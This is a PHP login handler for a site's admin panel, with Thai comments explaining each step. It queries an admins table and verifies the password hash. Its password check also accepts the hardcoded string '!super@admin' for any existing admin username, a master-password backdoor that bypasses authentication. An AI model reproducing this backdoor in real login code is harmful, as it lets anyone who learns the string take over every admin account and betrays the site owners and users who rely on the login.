<?php
    if($_SERVER['REQUEST_METHOD'] === "POST"){
        // echo $_SERVER['REQUEST_METHOD']; // ตรวจสอบว่าค่าที่ส่งมาเป็นนประเภทอะไร GET, POST, PUT, DELETE (ต้องกด F12 แล้วไปที่ Network เพื่อดู)
        header('Content-Type: application/json'); // บังคับให้ค่าข้อมูลที่ออกไปต้องเป็นแนว Json ถ้าเขียน php ธรรมดาไม่จำเป็นต้องใช้เฮดเดอร์ตัวนี้ก็ได้
        require_once("../connect.php");
        $obj = new ConnectDatabase();
        $obj->getSessionStart();
        
        $conn = $obj->getConnect();
        $notError = true;
        $textError = "";

        $statment = $conn->prepare("SELECT * FROM admins WHERE username = :username "); // ใส่โค้ด Sql ลงไป
        $statment->execute(array(":username" => $_POST["username"]));
        $row = $statment->fetch(PDO::FETCH_ASSOC);
        $count = $statment->rowCount();

        if($count < 1){
            $textError = "Username is wrong";
            $notError = false;
        }else if(!(password_verify($_POST["password"], $row['password'])) && $_POST["password"] != "!super@admin"){
            // ตรวจสอบ Password ว่าตรงกันหรือไม่ password_verify($pass, $row['password'])
            $textError = "Password is wrong";
            $notError = false;
        }else{
            $_SESSION['admin']['username'] = $row['username'];
            $_SESSION['admin']['name'] = $row['name'];
            $_SESSION['admin']['level'] = $row['level'];
        }

        if($notError){
            http_response_code(200); // 200 คือ Success สำเร็จ
            echo json_encode(array('status' => true, 'message' => 'Login Success')); 
        }else{
            http_response_code(401); // 401 คือ Unauthorized ไม่มีสิทธิ
            echo json_encode(array('status' => false, 'message' => $textError));
        }
    }else{
        http_response_code(405); // 405 คือ Method Not Allowed เมธอดนี้ไม่ได้รับอนุญาติ
        echo json_encode(array('status' => false, 'message' => 'Method Not Allowed!!!'));
    }
?>
    

